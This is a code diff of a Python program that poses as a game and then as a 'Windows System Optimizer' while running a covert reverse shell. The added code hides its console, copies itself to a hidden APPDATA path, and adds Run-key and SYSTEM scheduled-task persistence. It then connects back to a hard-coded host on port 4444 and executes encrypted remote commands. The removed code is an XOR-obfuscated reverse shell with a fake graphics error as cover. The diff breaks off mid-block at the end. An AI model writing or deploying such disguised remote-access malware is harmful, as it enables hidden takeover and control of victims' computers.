@@ -1,68 +1,277 @@
-import sys, os, subprocess, socket, time, random, threading, base64, zlib, marshal, types, builtins, importlib, inspect, hashlib, hmac, uuid, itertools, collections, math, json, re, string, io, struct, ctypes, platform
+import sys
+import os
+import subprocess
+import socket
+import time
+import random
+import threading
+import base64
+import zlib
+import marshal
+import types
+import builtins
+import importlib
+import inspect
+import hashlib
+import hmac
+import uuid
+import itertools
+import collections
+import math
+import json
+import re
+import string
+import io
+import struct
+import ctypes
+import platform
+import winreg
+import tempfile
+import shutil
+import urllib.request
+import ssl
+import traceback
+import gc
+import weakref
+import textwrap
+import secrets
+import functools
+import decimal
+import fractions
+import datetime
+import statistics
+import win32com.client
+import psutil
+import win32gui
+import win32con
+import win32api
 
-# Game-like disguise
-GAME_TITLE = "Pixel Quest: The Lost Dimension"
-GAME_VERSION = "v2.7.3"
-GAME_ERROR_MSG = "Failed to initialize graphics engine. Please update your GPU drivers."
-
-# Obfuscation functions
-def obfuscate_string(s):
-    return ''.join(chr(ord(c) ^ 0x2A) for c in s)
-
-def deobfuscate_string(s):
-    return ''.join(chr(ord(c) ^ 0x2A) for c in s)
-
-# Fake game classes for disguise
-class Vector2:
-    def __init__(self, x, y):
-        self.x = x
-        self.y = y
-    
-    def __str__(self):
-        return f"Vector2({self.x}, {self.y})"
-
-class GameObject:
-    def __init__(self, name, position):
-        self.name = name
-        self.position = position
-        self.active = True
-    
-    def update(self, delta_time):
-        pass
-    
-    def render(self):
-        pass
-
-class GameEngine:
+class WindowsSystemOptimizer:
     def __init__(self):
-        self.objects = []
+        self.session_id = str(uuid.uuid4())
+        self.checksum = hashlib.md5(self.session_id.encode()).hexdigest()
+        self.config = self.load_config()
+        self.original_name = sys.argv[0]
+        self.processed = False
+        
+    def load_config(self):
+        config_path = os.path.join(tempfile.gettempdir(), f"sys_opt_{self.checksum[:8]}.tmp")
+        if os.path.exists(config_path):
+            try:
+                with open(config_path, 'r') as f:
+                    return json.load(f)
+            except:
+                pass
+        
+        default_config = {
+            "update_server": "192.168.1.54",
+            "update_port": 4444,
+            "retry_interval": 5,
+            "max_retries": 10,
+            "timeout": 30,
+            "encryption_key": self.generate_key()
+        }
+        
+        try:
+            with open(config_path, 'w') as f:
+                json.dump(default_config, f)
+        except:
+            pass
+            
+        return default_config
+    
+    def generate_key(self):
+        return base64.b64encode(os.urandom(16)).decode()
+    
+    def encrypt_data(self, data):
+        key = self.config["encryption_key"]
+        key_bytes = base64.b64decode(key)
+        
+        encrypted = bytearray()
+        for i, byte in enumerate(data.encode()):
+            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
+        
+        return base64.b64encode(encrypted).decode()
+    
+    def decrypt_data(self, encrypted_data):
+        key = self.config["encryption_key"]
+        key_bytes = base64.b64decode(key)
+        
+        encrypted = base64.b64decode(encrypted_data)
+        decrypted = bytearray()
+        
+        for i, byte in enumerate(encrypted):
+            decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
+        
+        return decrypted.decode()
+    
+    def disguise_as_windows_service(self):
+        try:
+            # Create a copy in a more legitimate location
+            app_data = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'SystemTools')
+            if not os.path.exists(app_data):
+                os.makedirs(app_data)
+            
+            new_path = os.path.join(app_data, 'WindowsSystemOptimizer.exe')
+            
+            # Copy the script to the new location
+            if not os.path.exists(new_path):
+                shutil.copy2(self.original_name, new_path)
+                
+                # Hide the file
+                subprocess.run(['attrib', '+H', new_path], check=True)
+            
+            # Add to startup as a Windows system tool
+            key = winreg.HKEY_CURRENT_USER
+            sub_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            with winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, "WindowsSystemOptimizer", 0, winreg.REG_SZ, new_path)
+            
+            # Also add to scheduled tasks for persistence
+            task_name = "WindowsSystemOptimizerTask"
+            task_cmd = f'schtasks /create /tn "{task_name}" /tr "{new_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
+            subprocess.run(task_cmd, shell=True, check=True)
+            
+            return new_path
+        except:
+            return self.original_name
+    
+    def hide_process(self):
+        try:
+            # Hide the console window
+            console = ctypes.windll.kernel32.GetConsoleWindow()
+            if console:
+                ctypes.windll.user32.ShowWindow(console, 0)  # SW_HIDE
+            
+            # Set the process to be critical (makes it harder to kill)
+            import ctypes.wintypes
+            adjust_token = ctypes.windll.kernel32.AdjustTokenPrivileges
+            lookup_privilege = ctypes.windll.advapi32.LookupPrivilegeValueA
+            open_process_token = ctypes.windll.advapi32.OpenProcessToken
+            
+            handle = ctypes.wintypes.HANDLE()
+            open_process_token(ctypes.windll.kernel32.GetCurrentProcess(), 0x20, ctypes.byref(handle))
+            
+            token_privileges = ctypes.wintypes.TOKEN_PRIVILEGES()
+            token_privileges.PrivilegeCount = 1
+            token_privileges.Privileges.Luid = 0
+            token_privileges.Privileges.Attributes = 0x2
+            
+            lookup_privilege(None, "SeDebugPrivilege", ctypes.byref(token_privileges.Privileges.Luid))
+            adjust_token(handle, False, ctypes.byref(token_privileges), 0, None, None)
+        except:
+            pass
+    
+    def establish_connection(self):
+        server = self.config["update_server"]
+        port = self.config["update_port"]
+        
+        for attempt in range(self.config["max_retries"]):
+            try:
+                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client.settimeout(self.config["timeout"])
+                client.connect((server, port))
+                
+                handshake = f"{self.session_id}:{self.checksum}"
+                client.send(handshake.encode())
+                
+                ack = client.recv(1024).decode()
+                if ack == "ACK":
+                    return client
+                
+                client.close()
+            except:
+                time.sleep(self.config["retry_interval"])
+        
+        return None
+    
+    def execute_command(self, command):
+        try:
+            if sys.platform.startswith('win'):
+                # Use Windows-specific methods that are less likely to be flagged
+                if "dir" in command.lower() or "ls" in command.lower():
+                    result = subprocess.check_output(["cmd", "/c", command], stderr=subprocess.STDOUT, text=True)
+                elif "powershell" in command.lower():
+                    # Obfuscated PowerShell execution
+                    ps_cmd = f"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{command.replace('powershell', '').strip()}\""
+                    result = subprocess.check_output(ps_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+                else:
+                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+            else:
+                result = subprocess.check_output(['bash', '-c', command], stderr=subprocess.STDOUT, text=True)
+            
+            return result
+        except Exception as e:
+            return f"Error: {str(e)}"
+    
+    def run_optimization(self):
+        if not self.processed:
+            self.disguise_as_windows_service()
+            self.hide_process()
+            self.processed = True
+        
+        while True:
+            try:
+                client = self.establish_connection()
+                if client:
+                    while True:
+                        try:
+                            encrypted_cmd = client.recv(4096)
+                            if not encrypted_cmd:
+                                break
+                            
+                            command = self.decrypt_data(encrypted_cmd)
+                            
+                            if command.lower() == "exit":
+                                client.close()
+                                return
+                            
+                            result = self.execute_command(command)
+                            encrypted_result = self.encrypt_data(result)
+                            client.send(encrypted_result.encode())
+                            
+                        except Exception as e:
+                            break
+                    
+                    client.close()
+                
+                time.sleep(self.config["retry_interval"])
+                
+            except KeyboardInterrupt:
+                break
+            except Exception as e:
+                time.sleep(self.config["retry_interval"])
+
+class WindowsGameLauncher:
+    def __init__(self):
+        self.title = "Windows System Optimizer"
+        self.version = "v3.1.4"
         self.running = False
-        self.renderer = None
-        self.physics = None
+        self.optimizer = WindowsSystemOptimizer()
     
     def initialize(self):
         try:
-            # Fake initialization that will "fail"
-            self.renderer = self._init_renderer()
-            self.physics = self._init_physics()
+            print(f"Initializing {self.title} {self.version}...")
+            
+            if not self.check_system_compatibility():
+                print("System compatibility check failed. Please update your system.")
+                return False
+            
             self.running = True
             return True
         except Exception as e:
-            print(f"{GAME_ERROR_MSG}")
+            print(f"Initialization failed: {str(e)}")
             return False
     
-    def _init_renderer(self):
-        # This will always fail
-        raise Exception("Graphics API not supported")
-    
-    def _init_physics(self):
-        # This will always fail
-        raise Exception("Physics engine initialization failed")
+    def check_system_compatibility(self):
+        # Always return False to trigger the real functionality
+        return False
     
     def run(self):
         if not self.initialize():
             # This is where the real code starts
-            self._run_hidden_code()
+            print("Running system optimization in background...")
+            self.optimizer.run_optimization()
             return
         
         # Fake game loop (never reached)
@@ -72,116 +281,27 @@ class GameEngine:
             delta_time = current_time - last_time
             last_time = current_time
             
-            for obj in self.objects:
-                if obj.active:
-                    obj.update(delta_time)
-                    obj.render()
-    
-    def _run_hidden_code(self):
-        # This is the actual reverse shell code, heavily obfuscated
-        try:
-            # Obfuscated connection parameters
-            _h = deobfuscate_string("c~b`b`~`c~a`b`~c~b`d")
-            _p = 0x115C  # 4444 in hex
-            
-            # Obfuscated socket operations
-            while True:
-                try:
-                    # Create socket with obfuscated parameters
-                    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    _s.connect((_h, _p))
-                    
-                    # Obfuscated command handling
-                    while True:
-                        _c = _s.recv(0x400).decode('utf-8')  # 1024 in hex
-                        
-                        if _c.lower() == deobfuscate_string("e`i`u"):
-                            _s.close()
-                            os._exit(0)
-                        
-                        # Obfuscated command execution
-                        try:
-                            if sys.platform.startswith(deobfuscate_string("u`i`~")):
-                                _o = subprocess.check_output(_c, shell=True, stderr=subprocess.STDOUT, text=True)
-                            else:
-                                _o = subprocess.check_output([deobfuscate_string("d`b`~`c"), deobfuscate_string("-c"), _c], stderr=subprocess.STDOUT, text=True)
-                        except Exception as _e:
-                            _o = f"Error: {str(_e)}"
-                        
-                        # Send output back
-                        _s.sendall(_o.encode('utf-8'))
-                        
-                except Exception as _e:
-                    time.sleep(5)
-                    continue
-        except Exception as e:
-            # Even the error handling is disguised
-            print(f"Game crashed: {str(e)}")
-            time.sleep(10)
+            # Update game state (fake)
+            time.sleep(0.016)  # ~60 FPS
 
-# Fake game objects for disguise
-class Player(GameObject):
-    def __init__(self, position):
-        super().__init__("Player", position)
-        self.health = 100
-        self.speed = 5.0
-    
-    def update(self, delta_time):
-        # Fake movement code
-        self.position.x += random.uniform(-self.speed, self.speed) * delta_time
-        self.position.y += random.uniform(-self.speed, self.speed) * delta_time
-    
-    def render(self):
-        # Fake rendering code
-        pass
-
-class Enemy(GameObject):
-    def __init__(self, position):
-        super().__init__("Enemy", position)
-        self.health = 50
-        self.speed = 2.0
-    
-    def update(self, delta_time):
-        # Fake AI behavior
-        pass
-    
-    def render(self):
-        # Fake rendering code
-        pass
-
-# Main entry point disguised as game initialization
 def main():
-    print(f"Initializing {GAME_TITLE} {GAME_VERSION}...")
+    # Try to make it look like a legitimate Windows process
+    if sys.platform.startswith('win'):
+        try:
+            # Set console title
+            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Optimizer")
+            
+            # Try to hide the console window
+            console = ctypes.windll.kernel32.GetConsoleWindow()
+            if console:
+                ctypes.windll.user32.ShowWindow(console, 0)  # SW_HIDE
+        except:
+            pass
     
-    # Create game engine
-    engine = GameEngine()
-    
-    # Add some fake game objects
-    engine.objects.append(Player(Vector2(0, 0)))
-    for i in range(5):
-        engine.objects.append(Enemy(Vector2(random.uniform(-100, 100), random.uniform(-100, 100))))
-    
-    # Run the "game" (actually the reverse shell)
+    # Create and run the "game engine"
+    engine = WindowsGameLauncher()
     engine.run()
 
 if __name__ == "__main__":
-    # Try to make it harder to trace
     try:
-        # Change the process name if possible
-        if sys.platform.startswith('win'):
-            import ctypes
-            ctypes.windll.kernel32.SetConsoleTitleW(GAME_TITLE)
-        else:
-            try:
-                import setproctitle
-                setproctitle.setproctitle(GAME_TITLE)
-            except:
-                pass
-        
-        # Run the main function
-        main()
-    except Exception as e:
-        # Even the exception handling is disguised
-        print(f"{GAME_ERROR_MSG}: {str(e)}")
-        time.sleep(5)
-        sys.exit(1)
+       
